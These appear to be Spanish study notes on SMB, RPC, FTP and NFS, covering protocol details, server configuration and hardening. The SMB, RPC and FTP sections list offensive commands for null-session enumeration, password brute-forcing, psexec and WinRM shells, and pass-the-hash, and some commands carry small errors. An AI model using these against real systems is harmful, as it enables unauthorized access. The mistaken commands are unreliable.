# 1. SMB - Server Message Block

> [!NOTE] 
> **SMB (Server Message Block)** es el protocolo de red de Microsoft para compartir archivos, impresoras e IPC entre equipos. Es la columna vertebral del almacenamiento compartido en entornos Windows y Active Directory, implementado en Linux mediante **Samba**

## 1.1. 🔌 Puertos y transporte

SMB ha evolucionado significativamente desde sus orígenes en IBM en los años 80.

| Versión       | OS                   | Características clave                                                                    | Estado                                |
| ------------- | -------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------- |
| CIFS          | Windows NT 4.0       | Comunicación a través de la interfaz NetBIOS                                             | ❌ Obsoleto y peligroso (Eternal Blue) |
| **SMB 1.0**   | Windows 2000         | Operaciones básicas, Conexión directa a través de TCP, sin cifrado                       | ❌ Obsoleto y peligroso (Eternal Blue) |
| **SMB 2.0**   | Vista / Server 2008  | Menos comandos (100→20), paquetes más grandes, más rendimiento, firma de mensajes, caché | ⚠️ Legacy                             |
| **SMB 3.0**   | Win 8 / Server 2012  | Cifrado de extremo a extremo, multicanal, acceso a almacenamiento remoto                 | ✅ Actual                              |
| **SMB 3.1.1** | Win 10 / Server 2016 | AES-256 (desde Win 11/Server 2022), comprobación de integridad                           | ✅ Recomendado                         |

> [!NOTE] 
> **CIFS vs SMB CIFS:** (Common Internet File System) es simplemente el nombre que recibió SMB 1 cuando Microsoft lo documentó públicamente en los 90. En la práctica, "CIFS" y "SMB 1" son lo mismo. El término CIFS sigue usándose en Linux para referirse al cliente Samba en general (`mount -t cifs`), pero el protocolo que usa es el moderno

> [!NOTE]
> **NetBIOS:** SMB1 usaba los puertos 137, 138 y 139 para NetBIOS, pero las versiones modernas solo usan el 445 sobre el protocolo TPC/IP. Los puertos NetBios siguen habilitados en entornos AD modernos, pero se recomienda desactivarlos para evitar LLMNR/NBT-NS poisoning. NetBIOS es una API para permitir que una aplicación se conectara y compartiera datos con otro sistema, identificado por un nombre, dado por NBT-NS

> [!NOTE]
> Workgroup: Un grupo de trabajo es un nombre que identifica un grupo de ordenadores y sus recursos en una red SMB


---
## 1.2. 🤝 El flujo de conexión SMB — nivel de red

La comunicación SMB implica una serie de mensajes de petición y respuesta entre cliente y servidor:

1️⃣ **Negotiate:** el cliente inicia la comunicación SMB indicando qué versiones del protocolo soporta y el servidor elige cuál van a utilizar ambos durante la conexión. También se acuerdan características de seguridad y funcionamiento: el cifrado, la firma o los tamaños máximos de datos que se pueden enviar.

2️⃣ **Session Setup:** El cliente se autentica frente al servidor mediante NTLM o Kerberos. Si la autenticación es válida, el servidor crea la sesión SMB y le asigna un identificador único (`SessionID`).

3️⃣ **Tree Connect:** El cliente solicita acceso a una carpeta compartida y el servidor devuelve un identificador del recurso (`TreeID`) junto con el tipo de recurso y los permisos disponibles.

4️⃣ **File Operations:** El cliente por tanto puede interactuar con archivos y carpetas. Para ello envía peticiones SMB para abrir archivos (`CREATE`), leer contenido (`READ`), escribir datos (`WRITE`) o cerrar archivos (`CLOSE`), utilizando identificadores (`FileId`) que el servidor asigna a cada archivo abierto.

> [!CAUTION]
> NTLM Relay sobre SMB: Cuando un cliente autentica por NTLM sobre SMB, un atacante con Responder puede capturar el challenge-response y reenviarlo a otro servidor (NTLM Relay). El atacante nunca ve la contraseña pero puede autenticarse en nombre de la víctima. 
> > **Mitigación**: habilitar **SMB Signing** (requerido en DCs, opcional en el resto): 

## 1.3. Tipos de shares

| ShareType            | Descripción                                                    | Ruta UNC          |
| -------------------- | -------------------------------------------------------------- | ----------------- |
| **DISK**             | Carpeta compartida en disco                                    | `\\srv\datos`     |
| **IPC$**             | Inter-Process Communication — RPC sobre SMB                    | `\\srv\IPC$`      |
| **PRINT**            | Impresora compartida                                           | `\\srv\impresora` |
| `C$`, `D$`, `ADMIN$` | Shares administrativos ocultos (solo admins)                   | `\\srv\C$`        |
| **SYSVOL**           | La carpeta SYSVOL tiene el archivo Groups.xml con credenciales | `\\srv\SYSVOL`    |
> [!info] 
> El share invisible más importante `IPC$` es un share especial que no comparte archivos sino named pipes para RPC. Casi todas las operaciones administrativas remotas (gestión de servicios, usuarios, tareas...) pasan por `IPC$`. Es accesible incluso con sesión nula (`-N`) en configuraciones poco seguras, lo que permite enumerar usuarios y shares sin autenticarse.

---
## 1.4. 🖥️ Configuración en Windows

- **Desde GUI**
```
Clic derecho en carpeta 🡆 Propiedades 🡆 Compartir 🡆 Uso compartido avanzado
```

- Desde **Powershell**: 

| Acción                   | Comando                                                                                        |
| ------------------------ | ---------------------------------------------------------------------------------------------- |
| Crear un share nuevo     | `New-SmbShare -Name "datos" -Path "C:\datos" -FullAccess/ReadAccess/NoAccess "HOST\<usuario>"` |
| Ver shares existentes    | `Get-SmbShare` / `net view`                                                                    |
| Ver sesiones SMB activas | `Get-SmbSession` / `net session`                                                               |
| Eliminar un share        | `Remove-SmbShare -Name "datos"`                                                                |
| Deshabilitar SMB 1       | `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`                                 |
| Habilitar la firma       | `Set-SmbServerConfiguration -RequireSecuritySignature $true`                                   |
| Habilitar cifrado smb    | `Set-SmbServerConfiguration -EncryptData $true -Force`                                         |

---
## 1.5. 🖥️ Configuración en Linux (Samba)

**Samba** es la implementación de SMB para Linux/Unix. Permite que un sistema Linux actúe como servidor de archivos Windows.

- Se instala con `sudo apt install samba samba-client cifs-utils -y`

```
/etc/samba/
├── smb.conf          ← configuración principal
└── smbpasswd         ← base de datos de contraseñas (legacy)

/var/lib/samba/private/passdb.tdb  ← base de datos de usuarios Samba

/var/log/samba/
├── log.smbd          ← log del servidor
└── log.<cliente>     ← log por cliente conectado
```

**SMB.CONF.** El archivo se divide en secciones: `[global]` y una por cada share (Ej `[share]`). Para verificar la configuración es con `testparm`
```bash
[global]
    workgroup = WORKGROUP          # nombre del workgroup o dominio NetBIOS
    netbios name = SERVIDOR-LINUX  # nombre NetBIOS del servidor
# ---------------------------- AUTENTICACIÓN ----------------------------------- #
    security = user                # autenticación por usuario (no por share)
    map to guest = Never           # usuarios sin cuenta → no permitir invitado   
    guest ok = no   
    restrict anonymous = 2         # deshabilitar sesiones nulas
# ---------------------------- SEGURIDAD -------------------------------------- #
    server min protocol = SMB2     # NO permitir SMB1
    server max protocol = SMB3
    server signing = mandatory     # requerir SMB signing
    smb encrypt = required         # cifrado SMB3 obligatorio (solo SMB3)
# ---------------------------- LOGGING ---------------------------------------- #
    log file = /var/log/samba/log.%m   # %m = nombre del cliente
    log level = 1                      # 0=mínimo, 3=debug
 
[share]   
    comment = Share
    path = /srv/samba/datos        # path en el sistema
    browseable = yes               # visible al explorar la red
    read only = yes                # solo lectura
    writable = no                  # si permite escritura
    guest ok = no                  # acceso sin contraseña
    valid users = jessica, carlos  # solo estos usuarios
    enable privileges = no         # No mantener privilegios del usuario
# ---------------------------- PARA SHARES NO-RO ------------------------------- #
    write list = jessica           # solo jessica puede escribir
    create mask = 0664             # permisos de archivos nuevos
    directory mask = 0775          # permisos de carpetas nuevas
```

Al cambiar la config, hay que resetear el servicio `sudo systemctl restart smbd`

#### Usuarios
Samba mantiene su propia base de datos de contraseñas, separada de `/etc/passwd`. El usuario debe existir tanto en Linux como en Samba.

| Acción                                                    | Comando                               |
| --------------------------------------------------------- | ------------------------------------- |
| Crear un usuario Linux-samba nuevo                        | `useradd -M -s /sbin/nologin jessica` |
| Crear / Habilitar / deshabilitar / eliminar usuario samba | `smbpasswd -a/-e/-d/-x jessica `      |
| Cambiar su contraseña                                     | `smbpasswd jessica`                   |
| Listar usuarios samba                                     | `pdbedit -Lv `                        |
#### Permisos
 Los permisos en Samba tienen **dos capas** que se aplican de forma acumulativa: de entre los permisos del share y los permisos dentro del sistema de ficheros Linux, gana el más restrictivo.
```bash
mkdir -p /srv/samba/{publico,datos,dev}
chown -R root:root /srv/samba/
chown -R jessica:jessica /srv/samba/datos && chmod 770 /srv/samba/datos
```

> El servicio samba se llama `smbd` y para ver las sesiones activas podemos usar el comando `smbstatus`

---
## 1.6. 🖥️ Acceso - clientes SMB

#### SMBclient
Acceso interactivo
```bash
smbclient -L //192.168.1.50 -U jessica # Listar shares disponibles en un servidor
smbclient //192.168.1.50/datos -U jessica # Conectarse a un share interactivamente
smbclient //192.168.1.50/datos -U jessica -c "ls" # Ejecutar un comando directamente (sin modo interactivo)
smbclient //192.168.1.50/datos -U jessica --option="client max protocol=SMB3" # Forzar versión SMB concreta
```

| Listar archivos | Descargar         | Subir           | Descargar todos | Subir todos  | Crear directorio | Eliminar          |
| --------------- | ----------------- | --------------- | --------------- | ------------ | ---------------- | ----------------- |
| `ls`            | `get archivo.txt` | `put local.txt` | `mget *.txt`    | `mput *.log` | `mkdir carpeta`  | `del archivo.txt` |

#### SMBMap

| Comando               | Acción                                                                   |
| --------------------- | ------------------------------------------------------------------------ |
| Conectarse            | `smbmap -H <ip> -u <user> -p <pass>`                                     |
| Listar contenido      | `smbmap -H <ip> -u <user> -p <pass> -L`                                  |
| Conectarse a un share | `smbmap -H <ip> -u <user> -p <pass> -L -r <share>`                       |
| Descargar un archivo  | `smbmap -H <ip> -u <user> -p <pass> --download Shares/file.txt`          |
| Subir un archivo      | `smbmap -H <ip> -u <user> -p <pass> --upload ./file.txt Shares/file.txt` |
| Cmd                   | `smbmap -H <ip> -u <user> -p <pass> -x 'ipconfig'`                       |

#### mount.cifs
Montar el share en el sistema de archivos

| Comando                        | Cmd                                                                          |
| ------------------------------ | ---------------------------------------------------------------------------- |
| Instalar cliente CIFS          | `apt install cifs-utils -y`                                                  |
| Crear una carpeta para montaje | `mkdir -p /mnt/datos`                                                        |
| Montar temporalmente           | `mount -t cifs //<ip>/datos /mnt/datos -o username=jessica,password=Pass123` |
| Más opciones                   | `vers=3.0,` SMB 3.0, `seal` cifrado SMB                                      |
| Desmontarlo                  | `sudo umount /mnt/datos`                                |

Desde la GUI en Windows podemos conectarnos facilmente: `Este equipo` → `Conectar a unidad de red` → introducir `\\servidor\share`

#### cmd
Desde linea de comandos en Windows:

| Comando                      | Cmd                                                       |
| ---------------------------- | --------------------------------------------------------- |
| Listar shares de un servidor | `net view \\192.168.1.50` / `/all` para shares ocultos    |
| Conectarse a un share        | `net use Z: \\192.168.1.50\datos /user:jessica MiPass123` |
| Ver unidades mapeadas        | `net use`                                                 |
| Desconectar                  | `net use Z: /delete`                                      |

---
## 1.7. 🔍 Enumeración SMB (blue/red team)

Primero podemos enumerar con Nmap `sudo nmap -sCV -p 21 --script ftp*`

Para la fuerza bruta utilizaremos la herramienta netexec

| Comando                                         | Acción                                                                       |
| ----------------------------------------------- | ---------------------------------------------------------------------------- |
| Enumeración inicial                             | `nxc smb <ip>`                                                               |
| Enumerar shares sin autenticación (sesión nula) | `nxc smb <ip> --shares`                                                      |
| Enumerar con credenciales                       | `nxc smb <ip> -u <user> -p <pass> --shares`                                  |
| Fuerza bruta de contraseña                      | `nxc smb <ip> -u <user> -p <diccionario> --shares`                           |
| Enumerar usuarios grupos                        | `nxc smb <ip> -u <user> -p <pass> --users/--groups`                          |
| Probar usuarios con contraseñas                 | `nxc smb <ip> -u <dict_users> -p <dict_pass> --shares --continue-on-success` |

> [!CAUTION]
> Si al enumerar sale que está SMBv1 activado, es vulnerable a **eternalblue**, 
> Si no está firmado `signing:False` es vulnerable a **relay**, lo podemos confirmar con `nmap --script smb-vuln-ms17-010 <ip>`

Podemos transferir archivos con Linux montando un servidor impacket: `sudo impacket smbserver . $(pwd) carpeta`

> [!WARNING] 
> Obtener una shell:
> - **WINRM:** Si al enumerar con `nxc winrm` nuestro usuario sale `(Pwn3d!)`  → `evil-winrm -i <ip> -u <user> -p <pass>`
> - **SMB**: Si al enumerar con `nxc smb` nuestro usuario sale `(Pwn3d!)`  → `impacket-psexec WORGROUP/<user>@<ip> cmd.exe`
> - Pass the hash: Podemos utilizar un hash NTLM que no podamos romper: `nxc smb 10.10.20.20 -u 'Administrator' -H hash`


------
# 2. 📤 RPC — Remote Procedure Call

> [!NOTE] 
> RPC (Remote Procedure Call) es un protocolo que permite a un proceso ejecutar una función o procedimiento en otro proceso (que puede estar en la misma máquina o en una remota) como si fuera una llamada de función local. Este mecanismo se necesita porque los procesos están aislados en memoria. El proceso llamante no necesita conocer los detalles de la red ni implementar ninguna lógica de comunicación: desde su perspectiva, la llamada remota se comporta como una función ordinaria.

Fue diseñado originalmente por Sun Microsystems en los años 80 (ONC RPC / Sun RPC) y estandarizado en RFC 1057 (1988) y RFC 5531 (2009). Es la base de protocolos de nivel superior como NFS, NIS, y varios servicios internos de Windows (MSRPC/DCE RPC).

--------
## 2.1. Funcionamiento
Una llamada RPC implica un flujo de mensajes bien definido.

1️⃣ El proceso cliente se conecta al puerto 135, donde está el **endpoint mapper/rpcbind**, que le indica a qué interfaz o endpoint RPC debe conectarse para acceder al proceso servidor

2️⃣ Una vez sabe dónde ir, empaqueta los parámetros en un formato que pueda viajar por la red (**marshalling**) y en el servidor se desempaquetan (**unmarshalling)** se ejecuta la función correspondiente y se devuelve el resultado por el mismo camino.

3️⃣ Los **stubs**, uno en el cliente y otro en el servidor, son los componentes que realizan ese empaquetado y desempaquetado de forma transparente.

> RPC utiliza distintos **transportes**, y uno de los más importantes en Windows son los **Named Pipes**. 


--------------
#### Paquetes RPC
RPC se basa en paquetes con estos componentes
- **XID**: un número de 4 bytes que identifica el mensaje para correlacionarlo con la respuesta
- **Message type**: llamada o respuesta `CALL (0)` / `REPLY (1)`
- **Credenciales**
- **Versión de RPC**

Luego 3 números que  forman la "dirección" de cualquier función RPC, para que el servidor sepa qué ejecutar.
- **Program Number**: Identifica el servicio RPC
- **Version number**: versión del programa. Ej `3` → (NFSv3)
- **Procedure number**: Función concreta a ejecutar dentro del servicio. Ej `6` → (READ)

Por último, manda los datos en un formato binario serializado llamado XDR, independiente de la arquitectura

--------
#### El Portmapper / rpcbind
Los servidores RPC no escuchan en puertos fijos (salvo NFSv4). Al arrancar, cada servidor registra su Program Number y el puerto que usa en el **portmapper**, que escucha siempre en el **puerto 111 (TCP y UDP)**.

```bash
# Consultar el portmapper de un servidor
rpcinfo -p 192.168.1.50           # listar todos los programas registrados
rpcinfo -T tcp 192.168.1.50 100003 3  # verificar acceso a NFS v3 via TCP
```

```
  [Cliente]                    [rpcbind :111]           [Servidor NFS :2049]
      │                              │                          │
      │── "¿En qué puerto está      │                          │
      │    el prog 100003 v3?" ─────▶│                          │
      │◀─ "Puerto 2049" ────────────│                          │
      │                              │                          │
      │──────────────────────────────── Llamada NFS READ ──────▶│
      │◀──────────────────────────────── Respuesta ─────────────│
```

-------------
#### Autenticación
RPC soporta varios flavors de autenticación que se incluyen en la cabecera de cada llamada:

|Flavor|Valor|Descripción|
|---|---|---|
|`AUTH_NONE`|0|Sin autenticación|
|`AUTH_SYS` (AUTH_UNIX)|1|UID/GID del proceso llamante — sin verificación criptográfica|
|`AUTH_SHORT`|2|Token abreviado de `AUTH_SYS` para siguientes llamadas|
|`RPCSEC_GSS`|6|Kerberos / GSSAPI — autenticación, integridad y cifrado opcionales|

> **AUTH_SYS** es el más común en NFS y rpcbind locales. El servidor confía en el UID/GID que declara el cliente sin verificarlo, lo que es el origen de vulnerabilidades como `no_root_squash` en NFS.

------------
#### Versiones
RPC cuenta con dos versiones distintas e incompatibles entre sí:

- **ONC RPC (Sun RPC)**: Es el mecanismo RPC original. Es simple, ligero  y ampliamente utilizado en sistemas Unix y Linux, especialmente en servicios como NFS. Serializa los datos por XDR y es bastante estandarizado. 

- **DCE RPC / MSRPC** es una versión adoptada y ampliada por Microsoft en Windows. Ofrece funciones más avanzadas, como autenticación integrada, autorización, cifrado y una mejor gestión de servicios distribuidos, lo que lo hace adecuado para entornos empresariales y redes Windows

## 2.2. Enumeración

Para enumerar por RPC, utilizamos `rpcclient`. Indicamos las credenciales con `-U user%pass`. Si no tenemos credenciales, podemos utilizar al invitado `-U Invitado%`. Luego se nos abre una consola, en la que podemos introducir comandos.

Aun así podemos lanzar comandos aislados con `-c comando`


| **Consulta**         | **Descripción**                                                                     |
| -------------------- | ----------------------------------------------------------------------------------- |
| `srvinfo`            | Información del servidor.                                                           |
| `querydominfo`       | Proporciona información de dominio, servidor y usuario de los dominios desplegados. |
| `netshareenumall`    | Enumera todos los recursos compartidos disponibles.                                 |
| `enumdomusers`       | Enumera todos los usuarios del dominio.                                             |
| `queryuser <RID>`    | Proporciona información sobre un usuario específico.                                |
| `enumdomgroups`      | Enumera todos los grupos del dominio.                                               |
| `lookupnames <user>` | Nos devuelve el SID de un usaurio a partir de su nombre                             |
| `lookupsids <SID>`   | Nos devuelve el nombre de un usaurio a partir de su SID                             |
```
SID="S-1-5-32"
for i in $(seq 500 1000); do
    rpcclient -U user%pass -c "lookupsids $sid-$i; quit" 10.10.10.14 | grep -v unknown
done
```

Aunque tambien podemos usar `Imapcket-samrdump 10.129.14.128` para automatizar el proceso

 
---
# 3. 📤 FTP — File Transfer Protocol

> FTP permite la transferencia de archivos entre un cliente y un servidor. A diferencia de NFS (que monta el sistema de archivos), FTP requiere que el usuario **descargue o suba** archivos explícitamente. Desarrollado en 1971, es uno de los protocolos más antiguos de Internet.

FTP utiliza **dos conexiones TCP separadas**:

| Canal                | Puerto          | Uso                                     |
| -------------------- | --------------- | --------------------------------------- |
| **Canal de control** | puerto 21       | Comandos y respuestas (siempre abierto) |
| **Canal de datos**   | puerto variable | Transferencia de archivos y listados    |
Esta separación es la causa de los problemas de FTP con firewalls y NAT, y da origen a los dos modos de operación.

--------------
## 3.1. 🔌 Puertos y variantes

FTP existe en varias versiones:

| Protocolo          | Puerto                           | Cifrado   | Descripción                                                      |
| ------------------ | -------------------------------- | --------- | ---------------------------------------------------------------- |
| **FTP**            | 21 (control), 20 (datos activo)  | ❌ Ninguno | Texto plano, obsoleto para datos sensibles                       |
| **FTPS** (FTP-SSL) | 21 (explícito) o 990 (implícito) | ✅ TLS/SSL | FTP con capa TLS. Dos conexiones como FTP                        |
| **SFTP**           | 22                               | ✅ SSH     | No es FTP real: es SSH File Transfer Protocol. Una sola conexión |
Además permite elegir entre dos modos:
- ◀ **Modo pasivo**: siempre que el cliente esté detrás de NAT o firewall (la mayoría de casos modernos)
- ▶ **Modo activo**: solo en redes internas controladas donde el servidor pueda alcanzar al cliente

#### Modo activo
El servidor **inicia** la conexión de datos hacia el cliente. *Es como un cartero que va a la casa del cliente*

> ⚠️ Como es una conexión entrante hacia el cliente, puede dar problemas detrás de NAT o Firewall

```bash
Cliente (detrás de NAT/firewall)          Servidor FTP
   │                                         │
   │── TCP SYN → puerto 21 (control) ──────▶ │ 
   │◀─ TCP ACK + bienvenida ─────────────────│
   │                                         │
   │── PORT 192.168.1.5,200,5 ─────────────▶ │  # "conéctate a mi IP:puerto"
   │   (cliente escucha en puerto 51205)     │  # puerto = 200*256 + 5 = 51205
   │                                         │
   │◀── TCP SYN desde puerto 20 ─────────────│  # servidor inicia conexión
```

#### Modo pasivo (PASV)
El cliente **siempre inicia** ambas conexiones.

```bash
Cliente (detrás de NAT/firewall)                 Servidor FTP
   │                                                 │
   │── TCP SYN → puerto 21 (control) ──────────────▶ │ 
   │◀─ TCP ACK + bienvenida ─────────────────────────│
   │                                                 │
   │── PASV ───────────────────────────────────────▶ │ #  "dame un puerto para datos"
   │◀─ 227 Entering Passive (192,168,1,50,195,149)   │ # puerto = 195*256 + 149 = 50069
   │                                                 │
   │── TCP SYN → puerto 50069 ─────────────▶         │ # cliente inicia conexión de datos
   │◀─ TCP ACK ──────────────────────────────────────│ # funciona con firewall
   │   transferencia de datos                        │
```


---
## 3.2. ⚙️ Configuración — vsftpd (Very Secure FTP Daemon)

`vsftpd` es el servidor FTP más común en Linux. 

Se instala con `sudo apt install vsftpd -y` y se activa con `sudo systemctl enable --now vsftpd`

La configuración se realiza mediante el fichero `/etc/vsftpd.conf`
```bash
listen=YES                     # escuchar en IPv4
listen_ipv6=NO                 # NO poner ambas a YES simultáneamente
local_enable=YES               # Usuarios locales del sistema pueden conectarse
write_enable=YES               # Escritura permitida (deshabilitada por defecto)
local_umask=022                # Máscara de permisos para archivos nuevos (022 = 644)
ftpd_banner=Servidor FTP privado. 
# ---------------------------- ANONYMOUS ------------------------------- #
anonymous_enable=NO            # deshabilitar acceso anónimo (recomendado)
# anon_upload_enable=NO
# anon_mkdir_write_enable=NO
# ---------------------------- CHROOT JAIL ------------------------------- #
chroot_local_user=YES          # Encerrar a los usuarios en su directorio home
allow_writeable_chroot=YES     # necesario si el home tiene permisos de escritura
# chroot_list_enable=YES       # Lista de usuarios EXCLUIDOS del chroot (pueden salir)
# chroot_list_file=/etc/vsftpd.chroot_list
# ---------------------------- PASIVO  ------------------------------- #
pasv_enable=YES                # Modo pasivo
pasv_min_port=40000            # rango de puertos pasivos
pasv_max_port=50000
# pasv_address=203.0.113.10   # IP pública si el servidor está detrás de NAT
# ---------------------------- LOGGING  ------------------------------- #
xferlog_enable=YES
xferlog_file=/var/log/vsftpd.log
xferlog_std_format=YES # formato estándar wu-ftp 
log_ftp_protocol=YES # loguear todos los comandos FTP
# ---------------------------- CONTROL DE SESIÓN  ----------------------- #
idle_session_timeout=300       # desconectar sesión inactiva (segundos)
data_connection_timeout=120    # timeout para transferencia de datos
max_clients=50                 # máximo de clientes simultáneos
max_per_ip=5                   # máximo por IP
local_max_rate=1048576         # límite de ancho de banda por usuario (bytes/s)
```

Los usuarios son usuarios del sistema Linux. Podemos por tanto crear un usuario solo para FTP (sin shell): `useradd -m -s /usr/sbin/nologin ftpuser`
- **Blacklist**: en `/etc/ftpusers` añadimos usuarios prohibidos
- **Whitelist**: (`userlist_enable=YES`): en `/etc/vsftpd.userlist` añadimos los usuarios que pueden acceder

Para pemitir el modo pasivo podemos configurar el firewall permitiendo la conexión de control y la de datos pasivos
```bash
sudo ufw allow 21/tcp
sudo ufw allow 40000:50000/tcp   # rango pasivo definido en vsftpd.conf
```

> En la mayoría de casos, **SFTP es preferible**: usa el mismo puerto que SSH (22), no necesita configuración adicional de firewall para el canal de datos, y el cifrado es robusto por defecto. Solo usar FTP/FTPS cuando hay una necesidad específica (clientes legacy, servidores web, etc.).

#### FTPS
Para FTPS añadimos este contenido al fichero
```bash
ssl_enable=YES
ssl_tlsv1_2=YES
ssl_sslv2=NO
ssl_sslv3=NO
rsa_cert_file=/etc/ssl/certs/vsftpd.pem       # Certificado y clave
rsa_private_key_file=/etc/ssl/private/vsftpd.key # Clave
force_local_data_ssl=YES     # Requerir TLS para usuarios locales
force_local_logins_ssl=YES   # Requerir TLS para usuarios locales
# allow_anon_ssl=NO      # Para clientes que no soporten TLS (no recomendado)
```

Podemos generar un certificado autofirmado y su llave:
```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/certs/vsftpd.pem
```

---
## 3.3. Acceso a FTP

#### ftp 
Cliente ftp básico Linux/Windows. Nos conectamos por `ftp <user>@<ip>`. Los comandos son los mismos que en Linux, pero tenemos además estos:
 
| Subir        | Descargar    | Descargar todos | Subir todos  | Crear directorio | Activo/pasivo | Modo binario | Modo texto |
| ------------ | ------------ | --------------- | ------------ | ---------------- | ------------- | ------------ | ---------- |
| `put <file>` | `put <file>` | `mget *.txt`    | `mput *.log` | `mkdir carpeta`  | `passive`     | `binary`     | `ascii`    |
> **sftp**: Cliente ftp ssl. Nos conectamos por `sftp -P 2222 <user>@<ip>`. Los comandos son los mismos que en ftp

> [!NOTE]
> Si ponemos `debug` podemos ver los comandos que se mandan por detras

#### Powershell
```powershell
$cliente = New-Object System.Net.WebClient
$cliente.Credentials = New-Object System.Net.NetworkCredential("usuario","contraseña")
$cliente.DownloadFile("ftp://192.168.1.50/archivo.txt", "C:\local\archivo.txt")
$cliente.UploadFile("ftp://192.168.1.50/subida.txt", "C:\local\subida.txt") # Subir archivo
```


#### LFTP
Cliente avanzado. Se instala con `sudo apt install lftp -y`. Uso: `lftp -u <user>,<pass> 192.168.1.50`

| Protocolo                             | Puerto                                |
| ------------------------------------- | ------------------------------------- |
| Listar con detalle                    | `lftp> ls -la`                        |
| Sincronizar directorio remoto → local | `lftp> mirror /remoto /local`         |
| Sincronizar local → remoto (reverse)  | `lftp> mirror -R /local /remoto`      |
| Descargar con 4 conexiones paralelas  | `lftp> pget -n 4 archivo.iso`         |
| Forzar modo pasivo                    | `lftp> set ftp:passive-mode on`       |
| Deshabilitar verificación SSL (lab)   | `lftp> set ssl:verify-certificate no` |

#### Curl
| Acción                   | Comando                                                         |
| ------------------------ | --------------------------------------------------------------- |
| Listar direcotorio       | `curl ftp://<ip>/archivo.txt --user <user>:<pass> `             |
| Descar archivo           | `curl ftp://<ip>/archivo.txt --user <user>:<pass> -o local.txt` |
| Subir archivo            | `curl -T local.csv ftp://<ip>/remoto/ --user <user>:<pass>`     |
| Con FTPS (TLS explícito) | `curl --ftp-ssl ftp://<ip>/archivo.txt --user <user>:<pass>`    |
| Con SFTP                 | `curl sftp://<ip>/archivo.txt --user <user>:<pass> -k`          |

- Para descargar todos los archivos disponibles: `wget -m --no-passive ftp://user:pass@10.129.14.136`

---
## 3.4. Ataques y fuerza bruta

Primero podemos enumerar con Nmap `sudo nmap -sCV -p 21 --script ftp*`

Si utiliza ssl `openssl s_client -connect 10.129.14.136:21 -starttls ftp`

Para la fuerza bruta podemos usar hydra: `hydra -L <diccionario.txt> -u <usuario> ftp <ip>`


---
# 4. NFS — Network File System

> **NFS (Network File System)** permite acceder a directorios de un servidor remoto **como si fueran locales**. El cliente monta el directorio y las aplicaciones no saben si el archivo está en local o en red. Es el estándar de facto para compartir archivos en entornos Linux/Unix y una fuente habitual de vulnerabilidades por mala configuración.

```
  Servidor NFS                          Cliente NFS
  ────────────                          ───────────
  /srv/datos/           ─── red ──────▶  /mnt/datos/   (montado)
  ├── proyecto/                           ├── proyecto/
  ├── informes/                           ├── informes/
  └── logs/                               └── logs/

  Las aplicaciones del cliente acceden a /mnt/datos como si fuera local.
  NFS redirige las operaciones (open, read, write...) al servidor por red via RPC.
```

---
## 4.1. 🔌 Puertos y versiones

NFS funciona sobre RCP (`ONC-RPC`/`SUN-RPC`) expuesto en los puertos `TCP` y `UDP` `111`, que utiliza la representación XDR para el intercambio de datos independiente del sistema.. El cliente convierte operaciones de ficheros locales (`open`, `read`, `write`...) en llamadas RPC que viajan por la red.

- **NFSv2**: Está obsoleto, permite solo archivos de menos de 2GB y no mantiene estado. Funciona solo por UDP

#### NFSv3
 Usa varios puertos TCP y UDP, permite archivos más grandes y mejor manejo de errores. 
```
Cliente → rpcbind (111)   → "¿en qué puerto está mountd?"   → responde: 20048
Cliente → mountd  (20048) → "quiero montar /srv/datos"      → responde: file handle raíz
Cliente → nfsd    (2049)  → LOOKUP "archivo.txt" (fh raíz)  → responde: file handle del archivo
Cliente → nfsd    (2049)  → READ   (file handle, offset, n) → responde: datos
```

> Cada operación es una petición RPC separada. El `file handle` es la referencia opaca que identifica cada archivo o directorio en el servidor; el cliente lo guarda y lo usa en todas las operaciones posteriores.

#### NFSv4.x
Utiliza las ACLs de los archivos, guarda estado y permite autenticación Kerberos. Todo ocurre en una sola conexión a `nfsd (2049)` gracias a la operación **COMPOUND**, que agrupa múltiples llamadas en un único paquete:
```
Cliente: COMPOUND                                                 Servidor: COMPOUND response 
[PUTROOTFH → LOOKUP "srv" → LOOKUP "datos" → OPEN "archivo.txt" → READ] → Todo de una vez
```

Esto reduce drásticamente la latencia frente a NFSv3, especialmente en redes lentas o con muchos archivos pequeños. Para navegar los exports, NFSv4 usa el **PseudoFS**: un sistema de archivos virtual que conecta todos los exports en un árbol navegable desde `/`, sin necesitar mountd.

---
## 4.2. ⚙️ Instalación y configuración del servidor

En Debian se instala con `sudo apt install nfs-kernel-server -y` y se activa con `sudo systemctl enable --now nfs-server`

Podemos ver las versiones activas de NFS con `cat /proc/fs/nfsd/versions`, por ejemplo `-2 +3 +4 +4.1 +4.2  (+ activo, - inactivo)`

Para la configuración de los directorios usamos el archivo `/etc/exports`. Cada línea define un directorio exportado y sus permisos.
```
/ruta/directorio   cliente(opciones)   cliente2(opciones2)
```

Las opciones son estas:

| Opción                                              | Valor            | Opción                                           | Valor              |
| --------------------------------------------------- | ---------------- | ------------------------------------------------ | ------------------ |
| Lectura y escritura                                 | `rw`             | Solo lectura                                     | `ro`               |
| Confirma antes de llegar a disco (rápido, riesgoso) | `async`          | Confirma escrituras en disco (seguro pero lento) | `sync`             |
| Root local (UID 0) → root remoto                    | `no_root_squash` | Root (UID 0) → nobody                            | `root_squash`      |
| Conserva los UIDs del cliente salvo root            | `no_all_squash`  | Todos → nobody                                   | `all_sqash`        |
| Habilita comprobación de árbol                      | `subtree_check`  | Evitar errores con renombrados                   | `no_subtree_check` |

---------
#### Autenticacción
El protocolo NFS `no` tiene ningún mecanismo propio de `autenticación` o `autorización`. 
- La autorización se configura por medio de las opciones de RPC
- La autorización se deriva de la información del sistema de archivos disponible

| `sec=sys`                                      | `sec=krb5`                      | `sec=krb5i`                                | `sec=krb5p`                     |
| ---------------------------------------------- | ------------------------------- | ------------------------------------------ | ------------------------------- |
| Confía en el UID/GID del cliente (sin cifrado) | Kerberos — identidad verificada | Kerberos + integridad (firma cada paquete) | Kerberos + integridad y cifrado |
Ejemplos:
```bash
/srv/publico     *(ro,sync,no_subtree_check) # Acceso para cualquier host (solo en laboratorio)

/srv/proyectos   192.168.1.0/24(ro,sync) 192.168.1.10(rw,sync) # Varios clientes con distintos permisos

/srv/seguro      192.168.1.0/24(rw,sync,sec=krb5p,no_subtree_check) # Export para NFSv4 con autenticación Kerberos
```

Para la configuración del servidor usamos `/etc/nfs.conf`
```bash
[nfsd]
threads=8          # número de threads del servidor (aumentar bajo carga alta)
